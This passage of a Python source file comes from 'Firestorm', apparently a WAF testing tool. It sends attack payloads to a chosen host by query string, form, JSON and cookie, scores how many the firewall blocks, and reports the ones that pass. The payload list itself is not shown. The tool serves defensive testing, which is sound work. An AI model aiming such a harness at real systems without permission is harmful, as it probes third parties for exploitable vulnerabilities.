            resp = session.post(url, data={"file": payload_val}, timeout=TIMEOUT)
            result, reason = detect_blocked(resp.status_code, resp.text)
            results_lfi.append(("POST", result, reason, resp.status_code, resp.text))
        except (requests.RequestException, UnicodeEncodeError) as exc:
            results_lfi.append(("POST", "error", str(exc)[:30], None, ""))
        
        # Determine final result:
        # - 'passed' if ANY method passed (potential vulnerability!)
        # - 'blocked' if ALL tested methods were blocked
        # - 'error' if all were errors
        results_set = set(r[1] for r in results_lfi)
        if "passed" in results_set:
            final_result = "passed"
        elif "blocked" in results_set:
            final_result = "blocked"
        else:
            final_result = "error"
        
        # Get best result details (prefer non-error)
        best = next((r for r in results_lfi if r[1] != "error"), results_lfi[0] if results_lfi else ("?", "error", "", None, ""))
        methods_tested = "+".join(r[0] for r in results_lfi)
        return make_result(best[3], final_result, best[2], f"GET({methods_tested})", best[4])
    
    # 6. COOKIE-BASED PAYLOADS
    # Payload is injected into Cookie header
    if payload.get("method") == "cookie":
        try:
            headers["Cookie"] = f"session={payload['value']}"
            resp = session.get(url, headers=headers, timeout=TIMEOUT)
            result, reason = detect_blocked(resp.status_code, resp.text)
            return make_result(resp.status_code, result, reason, "GET+Cookie", resp.text)
        except (requests.RequestException, UnicodeEncodeError) as exc:
            return make_result(None, "error", str(exc)[:50], "GET+Cookie", str(exc))
    
    # 7. DEFAULT: TEST MULTIPLE METHODS
    # Standard payloads are tested with GET (query), POST (form), and POST (JSON)
    results_methods = []
    last_body = ""
    
    # Test GET with query parameter
    try:
        resp = session.get(url, params={PARAM_NAME: payload["value"]}, timeout=TIMEOUT)
        result, reason = detect_blocked(resp.status_code, resp.text)
        results_methods.append(("GET", result, reason, resp.status_code))
        last_body = resp.text
    except (requests.RequestException, UnicodeEncodeError):
        results_methods.append(("GET", "error", "exception", None))
    
    # Test POST with form data (application/x-www-form-urlencoded)
    try:
        resp = session.post(url, data={PARAM_NAME: payload["value"]}, timeout=TIMEOUT)
        result, reason = detect_blocked(resp.status_code, resp.text)
        results_methods.append(("POST-form", result, reason, resp.status_code))
        if not last_body:
            last_body = resp.text
    except (requests.RequestException, UnicodeEncodeError):
        results_methods.append(("POST-form", "error", "exception", None))
    
    # Test POST with JSON body
    try:
        headers["Content-Type"] = "application/json"
        import json
        json_body = json.dumps({PARAM_NAME: payload["value"]})
        resp = session.post(url, data=json_body, headers=headers, timeout=TIMEOUT)
        result, reason = detect_blocked(resp.status_code, resp.text)
        results_methods.append(("POST-json", result, reason, resp.status_code))
        if not last_body:
            last_body = resp.text
    except (requests.RequestException, UnicodeEncodeError, json.JSONDecodeError):
        results_methods.append(("POST-json", "error", "exception", None))
    
    # Determine final result:
    # - 'passed' if ANY method passed (potential vulnerability!)
    # - 'blocked' if ALL methods were blocked
    # - 'error' if all were errors
    results_set = set(r[1] for r in results_methods)
    if "passed" in results_set:
        final_result = "passed"
    elif "blocked" in results_set:
        final_result = "blocked"
    else:
        final_result = "error"
    
    # Get first meaningful reason
    reason = next((r[2] for r in results_methods if r[2] and r[2] != "exception"), "")
    status = next((r[3] for r in results_methods if r[3] is not None), None)
    methods_tested = "+".join(r[0] for r in results_methods)
    
    return make_result(status, final_result, reason, methods_tested, last_body)


def summarize(results: List[Dict[str, Any]]) -> Tuple[Dict[str, Dict[str, int]], Dict[str, int]]:
    """Summarize results by category with blocked/passed/error/skipped counts."""
    category_summary: Dict[str, Dict[str, int]] = {}
    for r in results:
        cat = r["category"]
        result_type = r.get("result", "error")
        summary = category_summary.setdefault(cat, {"total": 0, "blocked": 0, "passed": 0, "error": 0, "skipped": 0})
        summary["total"] += 1
        if result_type in summary:
            summary[result_type] += 1

    overall = {"total": 0, "blocked": 0, "passed": 0, "error": 0, "skipped": 0}
    for s in category_summary.values():
        for key in overall:
            overall[key] += s[key]

    return category_summary, overall


def score(overall: Dict[str, int]) -> Tuple[float, str]:
    """Calculate WAF effectiveness score (blocked / (blocked + passed))."""
    testable = overall["blocked"] + overall["passed"]
    if testable == 0:
        return 0.0, "no testable results"
    percent = (overall["blocked"] / testable) * 100
    if percent >= 80:
        bucket = "strong"
    elif percent >= 50:
        bucket = "moderate"
    else:
        bucket = "weak"
    return percent, bucket


def print_report(results: List[Dict[str, Any]], csv_path: str = None):
    category_summary, overall = summarize(results)
    pct, bucket = score(overall)

    print("\n" + "=" * 70)
    print("PER CATEGORY SUMMARY")
    print("=" * 70)
    print(f"  {'Category':<25} {'Blocked':<10} {'Passed':<10} {'Error':<10} {'Skipped':<10}")
    print("-" * 70)
    for cat, s in category_summary.items():
        print(f"  {cat:<25} {s['blocked']:<10} {s['passed']:<10} {s['error']:<10} {s['skipped']:<10}")

    print("\n" + "=" * 70)
    print("OVERALL RESULT")
    print("=" * 70)
    print(f"  Total payloads:    {overall['total']}")
    print(f"  Blocked by WAF:    {overall['blocked']} (WAF detected attack)")
    print(f"  PASSED (2xx):      {overall['passed']} ⚠️  POTENTIAL VULNERABILITIES!")
    print(f"  Errors (4xx/5xx):  {overall['error']} (request failed)")
    print(f"  Skipped:           {overall['skipped']} (not testable)")
    print(f"\n  WAF Block Rate:    {pct:.1f}% (blocked / (blocked + passed))")
    print(f"  WAF Strength:      {bucket.upper()}")
    
    # Response code distribution
    status_codes: Dict[int, int] = {}
    for r in results:
        code = r.get("status")
        if code:
            status_codes[code] = status_codes.get(code, 0) + 1
    
    print("\n" + "=" * 70)
    print("RESPONSE STATUS CODE DISTRIBUTION")
    print("=" * 70)
    for code, count in sorted(status_codes.items()):
        label = ""
        if code in [401, 403, 406, 429]:
            label = " (WAF block)"
        elif 200 <= code < 300:
            label = " (SUCCESS - passed through!)"
        elif 400 <= code < 500:
            label = " (client error)"
        elif code >= 500:
            label = " (server error)"
        print(f"  HTTP {code}: {count} responses{label}")
    
    # List PASSED payloads (VULNERABILITIES) - only 2xx responses
    passed = [r for r in results if r.get("result") == "passed"]
    if passed:
        print("\n" + "=" * 70)
        print(f"⚠️  PASSED PAYLOADS ({len(passed)}) - POTENTIAL VULNERABILITIES!")
        print("=" * 70)
        for r in passed:
            body_preview = r.get("response_body", "")[:100].replace("\n", " ").strip()
            print(f"  [{r['category']}] {r['name']}")
            print(f"      Method: {r.get('method', 'N/A')}, Status: {r.get('status', 'N/A')}, Reason: {r.get('reason', 'N/A')}")
            if body_preview:
                print(f"      Response: {body_preview}...")
            print()
    else:
        print("\n" + "=" * 70)
        print("✅ NO PAYLOADS PASSED THROUGH - WAF appears effective")
        print("=" * 70)
    
    # Errors and skipped (for reference)
    errors = [r for r in results if r.get("result") == "error"]
    skipped = [r for r in results if r.get("result") == "skipped"]
    
    if errors:
        print("\n" + "=" * 70)
        print(f"ERRORS ({len(errors)}) - Requests that failed (not vulnerabilities)")
        print("=" * 70)
        # Group by reason
        error_reasons: Dict[str, int] = {}
        for r in errors:
            reason = r.get("reason", "unknown")[:30]
            error_reasons[reason] = error_reasons.get(reason, 0) + 1
        for reason, count in sorted(error_reasons.items(), key=lambda x: -x[1])[:10]:
            print(f"  {reason}: {count} payloads")
    
    if skipped:
        print("\n" + "=" * 70)
        print(f"SKIPPED ({len(skipped)}) - Could not test")
        print("=" * 70)
        for r in skipped[:5]:
            print(f"  [{r['category']}] {r['name']} - {r.get('reason', 'N/A')}")
    
    # Sample blocked responses (show first 5)
    blocked = [r for r in results if r.get("result") == "blocked"]
    if blocked:
        print("\n" + "=" * 70)
        print(f"SAMPLE BLOCKED RESPONSES (showing 5 of {len(blocked)})")
        print("=" * 70)
        for r in blocked[:5]:
            body_preview = r.get("response_body", "")[:150].replace("\n", " ").strip()
            print(f"  [{r['category']}] {r['name']}")
            print(f"      Method: {r.get('method', 'N/A')}, Status: {r.get('status', 'N/A')}, Reason: {r.get('reason', 'N/A')}")
            if body_preview:
                print(f"      Response: {body_preview}...")
            print()
    
    # Save CSV if path provided
    if csv_path:
        save_csv(results, csv_path)
        print(f"\n[+] Full results saved to: {csv_path}")


def save_csv(results: List[Dict[str, Any]], filepath: str):
    """Save results to CSV file with all details."""
    fieldnames = [
        "category", "name", "payload_value", "method", "status", 
        "result", "reason", "response_body"
    ]
    
    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
        writer.writeheader()
        for r in results:
            # Clean response body for CSV (remove newlines, limit length)
            row = r.copy()
            row["response_body"] = (row.get("response_body", "") or "").replace("\n", " ").replace("\r", "")[:1000]
            row["payload_value"] = (row.get("payload_value", "") or "")[:500]
            writer.writerow(row)


def parse_args(argv: List[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="🔥 Firestorm - WAF Security Testing Tool")
    parser.add_argument("--host", required=True, help="Target host or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default 80)")
    parser.add_argument("--no-csv", action="store_true", help="Don't generate CSV report")
    return parser.parse_args(argv)


def main(argv: List[str]):
    args = parse_args(argv)
    session = requests.Session()
    
    url = f"http://{args.host}:{args.port}/"
    
    total_payloads = sum(len(p) for p in PAYLOADS.values())
    
    print()
    print("  🔥🔥🔥 FIRESTORM v1.0 🔥🔥🔥")
    print("  WAF Security Testing Tool")
    print()
    print(f"  Target: {url}")
    print(f"  Payloads: {total_payloads}")
    print("=" * 70)
    print("\nResult categories:")
    print("  🛡️ BLOCKED: WAF detected and blocked the attack")
    print("  ⚠️  PASSED:  Payload went through - POTENTIAL VULNERABILITY!")
    print("  ❌ ERROR:   Request failed - not a vulnerability")
    print("  ⏭️  SKIPPED: Could not test (e.g., raw socket required)")
    print("\nDelivery methods:")
    print("  • GET query params  • POST form data  • POST JSON body")
    print("  • POST XML body     • URL path        • Cookie header")
    print("  • Custom HTTP headers")
    print("=" * 70)

    results: List[Dict[str, Any]] = []
    for category, payloads in PAYLOADS.items():
        print(f"\n[*] {category} ({len(payloads)} payloads)")
        for payload in payloads:
            result = send_payload(session, url, category, payload)
            results.append(result)
            res = result.get("result", "?")
            if res == "blocked":
                icon = "🛡️"
            elif res == "passed":
                icon = "⚠️"
            elif res == "skipped":
                icon = "⏭️"
            else:
                icon = "❌"
            method = result.get("method", "")[:15]
            print(f"    {icon} {payload['name'][:30]:<30} [{method:<15}] -> {result.get('status', 'N/A')} ({res})")

    # Generate CSV filename with timestamp
    csv_path = None
    if not args.no_csv:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        csv_path = f"waf_results_{args.host}_{timestamp}.csv"
    
    print_report(results, csv_path)


if __name__ == "__main__":
    main(sys.argv[1:])
